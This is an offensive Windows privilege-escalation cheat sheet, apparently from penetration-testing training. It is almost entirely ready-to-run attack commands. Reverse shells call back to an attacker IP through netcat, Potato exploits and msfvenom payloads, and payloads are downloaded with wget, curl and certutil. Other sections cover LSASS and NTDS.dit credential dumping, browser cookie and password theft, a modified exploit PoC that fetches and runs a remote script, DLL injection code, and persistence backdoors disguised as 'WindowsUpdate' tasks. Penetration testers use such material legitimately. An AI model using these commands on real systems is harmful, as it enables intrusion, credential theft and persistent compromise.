# Windows Privilege Escalation Cheat-Sheet

## 1. Awareness & Enumeration

### Situational Awareness
```cmd
# Network Information
ipconfig /all
arp -a
route print

# System Information
tasklist /svc
set
systeminfo
wmic qfe
Get-HotFix | ft -AutoSize

# Installed Programs
wmic product get name
Get-WmiObject -Class Win32_Product | select Name, Version

# Display Running Processes
netstat -ano
```

### Protection Enumeration
```powershell
# Check Windows Defender Status
Get-MpComputerStatus

# List AppLocker Rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Test AppLocker Policy
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### User & Group Information
```cmd
# Current User Information
echo %USERNAME%
whoami
whoami /priv
whoami /groups

# User Enumeration
query user
net user
net localgroup
net localgroup administrators
net accounts
```

### Network Services & Named Pipes
```cmd
# Display Active Network Connections
netstat -ano

# List Named Pipes (PowerShell)
gci \\.\pipe\

# List Named Pipes (with Pipelist)
pipelist.exe /accepteula

# Review Named Pipe Permissions
accesschk.exe /accepteula \\.\Pipe\<pipe_name> -v
```

---

## 2. Windows User Privileges

### SeImpersonate and SeAssignPrimaryToken

#### JuicyPotato
```cmd
# Step 1: Check privileges
whoami /priv

# Step 2: Set up netcat listener
# On attacker machine
sudo nc -lnvp <Port>

# Step 3: Execute JuicyPotato
c:\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe <Attacker_IP> <Port> -e cmd.exe" -t *
```

#### PrintSpoofer
```cmd
# Step 1: Verify Spooler service
Get-Service Spooler

# Step 2: Set up listener
sudo nc -lnvp <Port>

# Step 3: Execute PrintSpoofer
c:\PrintSpoofer.exe -c "c:\nc.exe <Attacker_IP> <Port> -e cmd"
```

#### RoguePotato
```cmd
# Step 1: Set up listener
sudo nc -lnvp <Port>

# Step 2: Execute RoguePotato
c:\RoguePotato.exe -r <Attacker_IP> -e "c:\nc.exe <Attacker_IP> <Port> -e cmd" -l 9999
```

#### PrintNightmare (CVE-2021-1675)
```powershell
# Step 1: Import module
Import-Module .\printnightmare.ps1

# Step 2: Create new admin user
Invoke-Nightmare -NewUser "admin" -NewPassword "P@ssw0rd!" -DriverName "PrintME"

# Step 3: Verify user creation
net localgroup administrators
```

### SeDebugPrivilege

#### Dump LSASS Process
```cmd
# Method 1: Procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 2: Task Manager
# 1. Open Task Manager
# 2. Find lsass.exe process
# 3. Right-click -> Create dump file

# Extract with Mimikatz
mimikatz.exe
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

#### Code Execution
```powershell
# Step 1: Find SYSTEM process PID
tasklist

# Step 2: Execute with ImpersonateFromParentPid
ipmo .\debugpriv.ps1; ImpersonateFromParentPid -ppid <PID> -command "C:\windows\system32\cmd.exe"

# Reverse Shell
ipmo .\debugpriv.ps1; ImpersonateFromParentPid -ppid <PID> -command "C:\windows\system32\cmd.exe" -cmdargs "/c powershell.exe -e <base64_revshell>"
```

### SeTakeOwnershipPrivilege

#### Enable and Use Privilege
```powershell
# Step 1: Enable privilege
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv

# Step 2: Check file ownership
Get-ChildItem -Path 'C:\target\file.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

# Step 3: Take ownership
takeown /f 'C:\target\file.txt'

# Step 4: Modify ACL
icacls 'C:\target\file.txt' /grant <user>:F
```

---

## 3. Windows Group Privileges

### Backup Operators

#### Enable Privileges and Copy Protected Files
```powershell
# Step 1: Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Step 2: Enable privilege
Set-SeBackupPrivilege

# Step 3: Copy protected file
Copy-FileSeBackupPrivilege 'C:\Confidential\file.txt' .\file.txt
```

#### Copy NTDS.dit
```cmd
# Step 1: Create shadow copy with diskshadow
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

# Step 2: Copy NTDS.dit
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\ntds.dit

# Step 3: Backup registry hives
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Step 4: Extract credentials (on Kali)
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

### Event Log Readers

#### Search Security Logs
```powershell
# Using wevtutil
wevtutil qe Security /rd:true /f:text | Select-String "/user"

# Using Get-WinEvent
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### DnsAdmins

#### DLL Injection Attack
```cmd
# Step 1: Generate malicious DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Step 2: Download to target
wget "http://<Attacker_IP>/adduser.dll" -outfile "adduser.dll"

# Step 3: Load custom DLL
dnscmd.exe /config /serverlevelplugindll C:\Users\<user>\Desktop\adduser.dll

# Step 4: Restart DNS service
sc stop dns
sc start dns

# Step 5: Verify result
net group "Domain Admins" /dom
```

#### Cleanup
```cmd
# Delete registry key
reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

# Restart DNS
sc start dns
```

#### WPAD Record Attack
```powershell
# Disable global query block
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.<domain>

# Add WPAD record
Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName dc01.<domain> -IPv4Address <Attacker_IP>
```

### Hyper-V Administrators

#### CVE-2018-0952 / CVE-2019-0841 Exploitation
```powershell
# Using hyperv-eop.ps1 exploit
# Target: C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

# Step 1: Take ownership
takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Step 2: Start service
sc.exe start MozillaMaintenance
```

### Print Operators

#### LoadDriver Privilege Escalation
```cmd
# Step 1: Add driver reference to registry
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

# Step 2: Enable privilege
EnableSeLoadDriverPrivilege.exe

# Step 3: Verify driver not loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

# Step 4: Exploit Capcom
.\ExploitCapcom.exe

# Automated approach
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
.\ExploitCapcom.exe

# Cleanup
reg delete HKCU\System\CurrentControlSet\Capcom
```

### Server Operators

#### Service Binary Path Modification
```cmd
# Step 1: Query service configuration
sc qc AppReadiness

# Step 2: Check service permissions
c:\Tools\PsService.exe security AppReadiness

# Step 3: Modify service binary path
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user> /add"

# Step 4: Start service
sc start AppReadiness

# Step 5: Verify admin membership
net localgroup Administrators
```

---

## 4. Attacking the OS

### User Account Control (UAC)

#### UAC Status Check
```cmd
# Check if UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# Check UAC level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Check Windows version
[environment]::OSVersion.Version
```

#### UAC Bypass (SystemPropertiesAdvanced.exe)
```cmd
# Step 1: Check PATH variable
cmd /c echo %PATH%

# Step 2: Generate malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Port> -f dll > srrstr.dll

# Step 3: Download to WindowsApps folder
curl http://<Attacker_IP>/srrstr.dll -O "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# Step 4: Start listener and execute
nc -lnvp <Port>
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

### Weak Permissions

#### Service Binary Hijacking
```cmd
# Step 1: Find modifiable service binaries
.\SharpUp.exe audit

# Step 2: Check permissions
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Step 3: Replace binary with malicious one
cmd /c copy /Y malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Step 4: Start service
sc start SecurityService
```

#### Weak Service Permissions
```cmd
# Step 1: Check service permissions
accesschk.exe /accepteula -quvcw <ServiceName>

# Step 2: Modify service binary path
sc config <ServiceName> binpath="cmd /c net localgroup administrators <user> /add"

# Step 3: Restart service
sc stop <ServiceName>
sc start <ServiceName>
```

#### Unquoted Service Path
```cmd
# Step 1: Find unquoted service paths
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

# Step 2: Check if we can write to path
# Example: C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
# Create: C:\Program.exe or C:\Program Files (x86)\System.exe
```

#### Registry ACL Abuse
```cmd
# Step 1: Check registry permissions
accesschk.exe /accepteula "<user>" -kvuqsw hklm\System\CurrentControlSet\services

# Step 2: Modify ImagePath
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName> -Name "ImagePath" -Value "C:\path\to\malicious.exe"
```

#### Modifiable Registry Autorun Binary
````
# Check Startup Programs
> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
````

### Kernel Exploits

#### CVE-2021-36934 (HiveNightmare/SeriousSam)
```cmd
# Step 1: Check permissions on SAM file
icacls c:\Windows\System32\config\SAM

# Step 2: Perform attack
.\HiveNightmare.exe
```

#### CVE-2020-0668
```cmd
# Step 1: Check current privileges
whoami /priv

# Step 2: Generate malicious binary
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<Attacker_IP> LPORT=<Port> -f exe > maintenanceservice.exe

# Step 3: Downloading the Malicious Binary (Twice)
wget http://<Our_IP>:8080/maintenanceservice.exe -O maintenanceservice.exe
wget http://<Our_Port>:8080/maintenanceservice.exe -O maintenanceservice2.exe

# Step 4: Run exploit
CVE-2020-0668.exe C:\Users\<user>\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Step 5: Replace file and start service
copy /Y maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
net start MozillaMaintenance
```

### Vulnerable Services

**Enumerating Installed Programs**
````
> wmic product get name
````

#### Example: Druva inSync 6.6.3
```powershell
# Step 1: Verify service is running
netstat -ano | findstr 6064
get-process -Id <PID>
get-service | ? {$_.DisplayName -like 'Druva*'}

# Step 2: Exploit using PowerShell PoC
$ErrorActionPreference = "Stop"
$cmd = "net user pwnd P@ssw0rd! /add"
$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

# Step 3: Verify user creation
net localgroup administrators
```
**Modifying PowerShell PoC**
````
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<Our_IP>:8080/shell.ps1')"

Rename the file Invoke-PowershellTCP.ps1 to shell.ps1 and append "Invoke-PowerShellTcp -Reverse -IPAddress <Our_IP> -Port <Our_Port>"
````
**Exploitation**
````
# Starting a Python Web Server
$ python3 -m http.server 8080

# Modifying the PowerShell execution policy 
> Set-ExecutionPolicy Bypass -Scope Process

# Execute POC
> .\poc.ps1
````

---

## 5. Credential Theft

### Credential Hunting

#### File System Search
```cmd
# Search for password in files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

# PowerShell search
select-string -Path C:\Users\<user>\Documents\*.txt -Pattern password

# File extensions
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

#### PowerShell History
```powershell
# Get PowerShell history path
(Get-PSReadLineOption).HistorySavePath

# Read history
gc (Get-PSReadLineOption).HistorySavePath

# Check all users' history
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

#### PowerShell Credentials
```powershell
# Decrypt stored credentials
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

#### Sticky Notes
```powershell
# Extract Sticky Notes database
Set-ExecutionPolicy Bypass -Scope Process
cd .\PSSQLite\
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

### Registry Credential Storage
```cmd
# Windows AutoLogon
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Putty sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

# Saved credentials
cmdkey /list

# Run as saved user
runas /savecred /user:<domain>\<user> "command"
```

### Browser Credentials
```cmd
# Chrome credentials with SharpChrome
.\SharpChrome.exe logins /unprotect
```

### WiFi Passwords
```cmd
# View saved networks
netsh wlan show profile

# Retrieve password
netsh wlan show profile <SSID> key=clear
```

### Additional Tools
```cmd
# LaZagne - all passwords
.\lazagne.exe all

# SessionGopher - RDP/SSH sessions
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target <Server>
```

---

## 6. Restricted Environments (Citrix Breakout)

### Basic Breakout Methodology
1. Gain access to a Dialog Box
2. Exploit the Dialog Box for command execution
3. Escalate privileges

#### Using Paint for Dialog Box
```cmd
# Step 1: Open Paint
# Step 2: File > Open
# Step 3: Navigate using file name field
# Example: \\127.0.0.1\c$\users\<user>\Desktop
# Step 4: Browse to system directories
```

#### SMB Share Access
```cmd
# Step 1: Create SMB server (Attacker)
impacket-smbserver -smb2support share $(pwd)

# Step 2: In dialog box, navigate to
\\<Attacker_IP>\share

# Step 3: Right-click on the pwn.exe binary and select Open
```

#### Alternative File Managers
```cmd
# Use tools like:
# - Q-Dir
# - Explorer++
# Access via SMB share method above
```

#### Shortcut Modification
```cmd
# Step 1: Right-click existing shortcut
# Step 2: Properties
# Step 3: Modify Target field to:
C:\Windows\System32\cmd.exe
# Step 4: Execute shortcut
```

#### Script Execution (.bat files)
```cmd
# Step 1: Create evil.bat with content:
cmd

# Step 2: Execute .bat file
```

### Privilege Escalation in Restricted Environment

#### Always Install Elevated
```cmd
# Step 1: Check registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Step 2: Create MSI (PowerUp)
Import-Module .\PowerUp.ps1
Write-UserAddMSI

# Step 3: Execute MSI
UserAdd.msi

# Step 4: Use new user
runas /user:backdoor cmd
```

#### UAC Bypass in Restricted Environment
```powershell
# Import and execute UAC bypass
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

---

## 7. Additional Techniques

### User Interaction Attacks

#### Monitor Process Command Lines
```powershell
# Monitor for new processes
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

# Execute remotely
IEX (iwr 'http://<Attacker_IP>/procmon.ps1')
```

#### SCF File Attack
```cmd
# Step 1: Create malicious SCF file (@Inventory.scf)
[Shell]
Command=2
IconFile=\\<Attacker_IP>\share\legit.ico
[Taskbar]
Command=ToggleDesktop

# Step 2: Start Responder
sudo responder -wrf -v -I tun0

# Step 3: Place file in accessible share
```

#### Malicious .lnk File
```powershell
# Create malicious .lnk file
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<Attacker_IP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### Clipboard Monitoring
```powershell
# Monitor clipboard activity
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

### Application Exploitation

#### mRemoteNG
```cmd
# Step 1: Find config file
%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml

# Step 2: Extract password hash from XML

# Step 3: Decrypt password
python3 mremoteng_decrypt.py -s "<password_hash>"
# With custom password
python3 mremoteng_decrypt.py -s "<password_hash>" -p <custom_password>
# Brute Force Custom Password
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "<password_hash>" -p $password 2>/dev/null;done
```

#### Slack Cookie Extraction
```powershell
# Firefox cookies
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
# Extract Slack Cookie from Firefox Cookies Database
$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

# Chrome cookies
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
Invoke-SharpChromium -Command "cookies slack.com"
```

#### Restic Backup
````powershell
# restic - Initialize Backup Directory
mkdir E:\restic2; restic.exe -r E:\restic2 init

# restic - Back up a Directory
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder

# restic - Back up a Directory with VSS
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

# restic - Check Backups Saved in a Repository
restic.exe -r E:\restic2\ snapshots

# restic - Restore a Backup with ID
restic.exe -r E:\restic2\ restore <ID> --target C:\Restore
````

### Miscellaneous Techniques

#### Always Install Elevated
```cmd
# Step 1: Check registry settings
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Step 2: Generate MSI payload
msfvenom -p windows/shell_reverse_tcp lhost=<Attacker_IP> lport=<Port> -f msi > aie.msi

# Step 3: Execute MSI
msiexec /i c:\users\<user>\desktop\aie.msi /quiet /qn /norestart
```

#### CVE-2019-1388
```cmd
# Step 1: Right-click hhupd.exe -> Run as administrator
# Step 2: Show information about publisher's certificate
# Step 3: Click on Issued by hyperlink
# Step 4: Browser opens as SYSTEM
# Step 5: Right-click -> View page source
# Step 6: Right-click -> Save as
# Step 7: Type c:\windows\system32\cmd.exe and press Enter
```

#### Living Off The Land (LOLBAS)
```cmd
# File transfer with certutil
certutil.exe -urlcache -split -f http://<Attacker_IP>/shell.bat shell.bat

# Encoding/Decoding
certutil -encode file1 encodedfile
certutil -decode encodedfile file2
```

#### User/Computer Description Field
````powershell
# Checking Local User Description Field
> Get-LocalUser

# Enumerating Computer Description Field with Get-WmiObject Cmdlet
> Get-WmiObject -Class Win32_OperatingSystem | select Description
````

#### Scheduled Tasks
````
# Enumerating Scheduled Tasks
> schtasks /query /fo LIST /v
> Get-ScheduledTask | select TaskName,State
````

#### Mount Virtual Disks
```cmd
# Windows: Right-click .vhd/.vhdx file -> Mount
# Or use Disk Management

# Linux:
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

---

## 8. End of Life Systems

### Windows Server 2008/2008 R2

#### Enumeration
```cmd
# Check patch level
wmic qfe

# Run Sherlock for vulnerabilities
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```

#### Metasploit Exploitation
```cmd
# Search for exploit
msf6 > search 2010-3338

# Set up SMB delivery
msf6 exploit(windows/smb/smb_delivery) > set target 0
msf6 exploit(windows/smb/smb_delivery) > set lhost <Attacker_IP>
msf6 exploit(windows/smb/smb_delivery) > set lport <Port>
msf6 exploit(windows/smb/smb_delivery) > set SRVHOST <Attacker_IP>
msf6 exploit(windows/smb/smb_delivery) > exploit

# On victim
rundll32.exe \\<Attacker_IP>\<share>\test.dll,0

# Privilege escalation
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION <ID>
msf6 exploit(windows/local/ms10_092_schelevator) > exploit
```

### Windows 7

#### Windows Exploit Suggester
```bash
# Download and setup dependencies
sudo python2.7 windows-exploit-suggester.py --update

# Run against systeminfo
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

#### MS16-032 PowerShell PoC
```powershell
# Step 1: Bypass execution policy
Set-ExecutionPolicy bypass -scope process

# Step 2: Execute exploit
Import-Module .\MS16-032_poc.ps1
Invoke-MS16-032
```

---

## Quick Assessment Commands

### Automated Tools
```cmd
# WinPEAS
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# SharpUp
.\SharpUp.exe audit

# Seatbelt
.\Seatbelt.exe all

# PrivescCheck
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```

### One-Liners
```cmd
# Quick privilege check
whoami /all && net localgroup administrators && net user

# Service enumeration
sc query state= all | findstr "SERVICE_NAME"

# Check for stored credentials
cmdkey /list

# AlwaysInstallElevated check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated && reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## Important References

- **LOLBAS**: https://lolbas-project.github.io/
- **GTFOBins**: https://gtfobins.github.io/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **PowerSploit**: https://github.com/PowerShellMafia/PowerSploit
- **UACME**: https://github.com/hfiref0x/UACME
- **Windows Exploit Suggester**: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- **Sherlock**: https://github.com/rasta-mouse/Sherlock
- **Watson**: https://github.com/rasta-mouse/Watson
- **Rubeus**: https://github.com/GhostPack/Rubeus
- **Mimikatz**: https://github.com/gentilkiwi/mimikatz

---

## DLL Injection Techniques

### LoadLibrary Method
```cpp
// Basic LoadLibrary injection example
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD targetProcessId = 1234; // Target PID
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    
    // Allocate memory in target process
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    
    // Write DLL path
    WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    
    // Get LoadLibrary address
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    
    return 0;
}
```

### DLL Hijacking
```cmd
# Step 1: Check Safe DLL Search Mode status
# Registry path: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
# SafeDllSearchMode = 1 (enabled) or 0 (disabled)

# Step 2: Identify DLL search order
# With Safe DLL Search Mode enabled:
# 1. Application directory
# 2. System directory  
# 3. 16-bit system directory
# 4. Windows directory
# 5. Current directory
# 6. PATH environment variable directories

# Step 3: Find missing DLLs in application directory
# Use Process Monitor to identify missing DLLs

# Step 4: Create malicious DLL with same name
# Place in higher priority search location
```

---

## Advanced Persistence Techniques

### Scheduled Tasks
```cmd
# Create scheduled task for persistence
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\temp\backdoor.exe" /sc daily /st 09:00 /ru SYSTEM

# Query scheduled tasks
schtasks /query /fo LIST /v | findstr "backdoor"

# Delete scheduled task
schtasks /delete /tn "WindowsUpdate" /f
```

### Registry Persistence
```cmd
# Current User Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\temp\backdoor.exe"

# Local Machine Run key (requires admin)
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\temp\backdoor.exe"

# Services key
reg add HKLM\System\CurrentControlSet\Services\MyService /v ImagePath /t REG_SZ /d "C:\Windows\temp\backdoor.exe"
```

### WMI Event Subscription
```powershell
# Create WMI event filter
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name="ProcessStartFilter"
    EventNameSpace="root\cimv2"
    QueryLanguage="WQL"
    Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'"
}

# Create WMI event consumer
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name="ProcessStartConsumer"
    CommandLineTemplate="C:\Windows\temp\backdoor.exe"
}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter=$Filter
    Consumer=$Consumer
}
```

---

The guide covers all major techniques from basic enumeration to advanced persistence and cleanup procedures.
